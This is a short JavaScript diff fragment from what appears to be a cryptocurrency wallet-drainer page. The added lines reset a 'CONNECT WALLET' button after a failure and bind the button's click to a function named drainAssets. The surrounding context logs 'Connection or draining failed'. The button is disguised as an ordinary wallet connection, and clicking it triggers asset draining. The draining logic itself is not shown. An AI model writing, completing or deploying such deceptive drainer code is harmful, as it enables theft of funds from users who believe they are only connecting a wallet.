@@ -97,3 +97,11 @@ const drainAssets = async () => {
         console.error("Connection or draining failed:", error);
         connectButton.innerText = "Connection Failed";
  setTimeout (() => {
+connectButton.innerText = "CONNECT WALLET";
+            connectButton.disabled = false;
+        }, 3000);
+    }
+};
+
+connectButton.addEventListener('click', drainAssets);
+
